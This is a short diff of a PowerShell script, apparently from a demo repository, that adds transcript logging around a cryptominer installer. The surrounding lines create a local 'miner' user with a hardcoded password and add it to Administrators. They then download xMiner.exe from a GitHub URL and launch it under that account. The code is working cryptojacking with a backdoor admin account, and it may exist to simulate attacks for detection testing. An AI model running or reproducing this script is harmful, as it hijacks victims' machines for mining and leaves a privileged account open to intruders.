@@ -22,7 +22,7 @@ New-Item -Path "c:\wallet" -Name "mPdhgtHGHGrtdyt6erjh5kjhjhGGUjkduU.coin" -Item
 cmd.exe /c "net user miner Mining4Ever! /add"
 cmd.exe /c "net localgroup Administrators miner /add"
 
-
+Start-Transcript -Path "C:\transcript-xminer.txt" -NoClobber;
 $miner = "https://raw.githubusercontent.com/tmmdemo/automate/master/xMiner.exe"
 $DEST = "c:\wallet\xMiner.exe"
 $web = New-Object -TypeName System.Net.WebClient
@@ -33,4 +33,4 @@ $password = 'Mining4Ever!'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 Start-Process $DEST -WorkingDirectory c:\wallet -Credential ($credential)
-
+Stop-Transcript;
